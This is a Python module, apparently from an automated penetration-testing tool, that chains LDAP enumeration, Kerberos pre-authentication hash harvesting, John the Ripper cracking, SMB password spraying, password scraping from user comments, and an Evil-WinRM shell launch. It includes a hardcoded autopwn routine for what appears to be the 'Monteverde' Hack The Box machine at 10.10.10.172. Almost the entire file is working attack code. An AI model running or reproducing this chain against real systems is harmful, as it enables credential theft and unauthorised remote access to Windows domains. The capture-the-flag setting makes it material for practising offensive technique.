#!/usr/bin/env python3

import os
from sty import fg
from autorecon.lib import nmapParser, ldap_imp, rpcenum
from autorecon.utils import config_parser, helper_lists
import re
from subprocess import call, PIPE, Popen
import requests
# from collections.abc import Iterable
from impacket.smbconnection import SMBConnection, SessionError
from time import sleep


class LdapEnum:
    """LdapEnum Will Enumerate all found Ldap open ports using nmap and enum4linux and ldapsearch."""

    def __init__(self, target):
        self.target = target
        self.processes = ""
        self.ldapper = ldap_imp.enumLdap(self.target)

    def Scan(self):
        """If Ldap ports are open, run nmap ldap scripts, enum4linux and the results
        will be fed to the ldap.sh bash script."""
        np = nmapParser.NmapParserFunk(self.target)
        np.openPorts()
        ldap_ports = np.ldap_ports
        if len(ldap_ports) == 0:
            pass
        else:
            c = config_parser.CommandParser(f"{os.path.expanduser('~')}/.config/autorecon/config.yaml", self.target)
            if not os.path.exists(c.getPath("ldap", "ldapDir")):
                os.makedirs(c.getPath("ldap", "ldapDir"))
            print(fg.cyan + "Enumerating LDAP: Lightweight Directory Access Protocol, Running the following commands:" + fg.rs)
            string_ldap_ports = ",".join(map(str, ldap_ports))
            commands = []
            commands.append(c.getCmd("ldap", "nmapLdap", ldapPorts=string_ldap_ports))
            commands.append(c.getCmd("ldap", "enum4linuxLdap"))
            self.processes = tuple(commands)

    def PwnWinRM(self):
        np = nmapParser.NmapParserFunk(self.target)
        np.openPorts()
        ldap_ports = np.ldap_ports
        if len(ldap_ports) == 0:
            pass
        else:
            c = config_parser.CommandParser(f"{os.path.expanduser('~')}/.config/autorecon/config.yaml", self.target)

            def parse_users():
                """
                Returns a list of users
                """
                if not os.path.exists(c.getPath("wordlists", "wordlistsDir")):
                    os.makedirs(c.getPath("wordlists", "wordlistsDir"))
                users_list = []
                user_obj = self.ldapper.get_all_users()
                with open(c.getPath("wordlists", "ldapUsernames"), "w+") as userlist_file:
                    for user in user_obj:
                        users_list.append(user['sAMAccountName'])
                        userlist_file.write(user['sAMAccountName'] + "\n")
                return users_list

            def check_parse_hashes():
                print(f"[{fg.li_magenta}+{fg.rs}] Creating List of Valid Usernames")
                users = parse_users()
                print(f"[{fg.li_green}+{fg.rs}] Checking for Kerberos Pre-Authentication TGT Hashes")
                domain = self.ldapper.get_domain()
                hashes = []
                if domain and users:
                    for u in users:
                        try:
                            hashes.append(self.ldapper.get_tgt(u))
                        except Exception as e:
                            print(e)
                    if hashes:
                        print(f"Found tgt hashes {hashes}")
                    if not os.path.exists(c.getPath("loot", "lootDir")):
                        os.makedirs(c.getPath("loot", "lootDir"))
                    with open(c.getPath("loot", "krbHashes"), "w") as hash_file:
                        if hashes:
                            for i in hashes:
                                hash_file.write(i.rstrip() + "\n")
                return hashes

            def HeresJonny():
                krb_hashes = check_parse_hashes()
                if krb_hashes:
                    print(f"[{fg.li_magenta}+{fg.rs}] Found krb hash!")
                    print(f"[{fg.li_magenta}+{fg.rs}] BruteForcing The Hash!")
                    john_cmd = c.getCmd("john", "jcrack", hashfile=f"{c.getPath('loot', 'krbHashes')}")
                    call(john_cmd, shell=True)
                    return True
                else:
                    return False

            def parseCreds():
                def cmdline(command):
                    process = Popen(args=command, stdout=PIPE, shell=True)
                    return process.communicate()[0]

                john_show_cmd = c.getCmd("john", "jshow", hashfile=f"{c.getPath('loot', 'krbHashes')}")
                john_show_output = [i.strip() for i in cmdline(john_show_cmd).decode("utf-8").split("\n")]
                num_cracked = [int(p[0]) for p in sorted(set(i for i in john_show_output if "password hash cracked," in i))]
                if (len(num_cracked) > 0):
                    if num_cracked[0] >= 1:
                        passwords = []
                        usernames = []
                        for i in john_show_output:
                            if ":" in i:
                                passwords.append(i.split(":")[1])
                                usernames.append(i.split(":")[0].split("$")[3].split("@")[0])
                                # print(i.split(":")[1])
                        return zip(usernames, passwords)

            def check_auth(creds=None):
                valid_creds = []
                print(f"[{fg.li_magenta}+{fg.rs}] Brute-Forcing found usernames over SMB")
                for user in parse_users():
                    try:
                        smb = SMBConnection(self.target, self.target)
                        test_login = smb.login(user, creds if creds is not None else user)
                    except SessionError:
                        test_login = False
                        print(f"Testing valid login: {user}:{creds if creds is not None else user} True or False? {fg.red}{test_login}{fg.rs}")
                    if test_login is True:
                        valid_creds.append(user)
                        print(f"\n[{fg.li_green}+{fg.rs}] Valid Credentials Found! {fg.li_green}{user}{fg.rs}:{fg.li_green}{creds if creds is not None else user}{fg.rs}\n")
                return valid_creds

            def query_disp_info():
                domain = self.ldapper.get_domain()
                sdi = rpcenum.SamrDisplayInfo(self.target, domain)
                dump_user_info = sdi.dump(self.target, self.target)
                checklist = ['pass', 'Pass']
                possible_credentials = []
                for i in dump_user_info:
                    if any(s in i['AdminComment'] for s in checklist):
                        # print(i['AdminComment'])
                        possible_credentials.append(i['AdminComment'])
                return possible_credentials

            def check_possible_creds():
                check_for_creds = query_disp_info()
                if check_for_creds:
                    wordlist = ' '.join(check_for_creds).split()
                    for word in wordlist:
                        valid_login = check_auth(creds=word)
                        if valid_login:
                            print("Found Creds {}:{}".format(valid_login, word))
                            return (valid_login[0], word)

            def winrm_connect(username, password):
                r = requests.post(f"http://{self.target}:5985/wsman", data="")
                if r.status_code == 401:
                    try:
                        dope = f"""{c.getCmd("winrm", "evilWinRM", username=username, password=password, SHELL="$SHELL")}"""
                        print(f"[{fg.li_magenta}+{fg.rs}] Found Valid Credentials!!!")
                        print(f"[{fg.li_magenta}+{fg.rs}] {fg.li_green}{username}:{password}{fg.rs}")
                        print(f"[{fg.li_magenta}+{fg.rs}] Evil-WinRM !!!")
                        print(f"[{fg.li_magenta}+{fg.rs}] " + dope)
                        print(f"[{fg.li_magenta}+{fg.rs}] Enjoy the Shell Playboy ;) ")
                        kwargs = {}
                        kwargs.update(start_new_session=True)
                        revshell = Popen(args=dope, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True, **kwargs)
                        assert not revshell.poll()

                    except IOError as e:
                        print(e)
                        exit()

            def monteverde(password):
                if os.path.exists(c.getPath("loot", "authSmbmap")):
                    download_azure_config = c.getCmd("smb", "azure", validPass=password)
                    print(download_azure_config)
                    call(download_azure_config, shell=True)
                    try:
                        if os.path.exists(f"{os.getcwd()}/10.10.10.172-users_mhope_azure.xml"):
                            from shutil import move
                            move(f"{os.getcwd()}/10.10.10.172-users_mhope_azure.xml", c.getPath("loot", "azure"))
                    except FileNotFoundError as fnf_err:
                        print(fnf_err)
                    if os.path.exists(c.getPath("loot", "azure")):
                        try:
                            import xmltodict
                            with open(c.getPath("loot", "azure"), "rb") as azure_file:
                                doc = xmltodict.parse(azure_file.read())
                                azure_pass = doc['Objs']['Obj']['Props']['S']['#text']
                                auth_user = check_auth(creds=azure_pass)
                                if azure_pass:
                                    if auth_user:
                                        winrm_connect(auth_user[0], azure_pass)
                        except FileNotFoundError as fnf_err:
                            print("FileNotFound: {}".format(fnf_err))

            def checkWinRm():
                if HeresJonny() is True:
                    r = requests.post(f"http://{self.target}:5985/wsman", data="")
                    if r.status_code == 401:
                        try:
                            user_pass = dict(parseCreds())
                        except TypeError as te:
                            print(te)
                            return 1
                        users = []
                        passwords = []
                        for k, v in user_pass.items():
                            users.append(k)
                            passwords.append(v)
                        if len(users) != 0 and (len(passwords) != 0):
                            winrm_connect(users[0], passwords[0])
                else:
                    print(f"[{fg.red}+{fg.rs}] No valid Credentials Found. {fg.red}Try Harder{fg.rs}")
                    if not os.path.exists(c.getPath("loot", "lootDir")):
                        os.makedirs(c.getPath("loot", "lootDir"))
                    valid_password = check_auth()
                    if valid_password:
                        print(f"{fg.li_green}[!]{fg.rs} Found Valid Credentials!!!\n Username: {fg.li_green}{valid_password[0]}{fg.rs}\n Password: {fg.li_green}{valid_password[0]}{fg.rs}\n")
                        print(f"[{fg.li_magenta}+{fg.rs}] Running smbmap with credentials")
                        auth_smb_check = c.getCmd("smb", "authSmb", validPass=valid_password[0])
                        print(auth_smb_check)
                        call(auth_smb_check, shell=True)
                        if self.target == "10.10.10.172":
                            autopwn_banner = r"""
                            _______         __          ______
                            |   _   |.--.--.|  |_.-----.|   __ \.--.--.--.-----.
                            |       ||  |  ||   _|  _  ||    __/|  |  |  |     |
                            |___|___||_____||____|_____||___|   |________|__|__|
                                                MONTEVERDE
                            """
                            print(f"{fg.li_magenta}{autopwn_banner}{fg.rs}")
                            monteverde(valid_password[0])
                    else:
                        creds_ = check_possible_creds()
                        winrm_connect(creds_[0], creds_[1])

            checkWinRm()
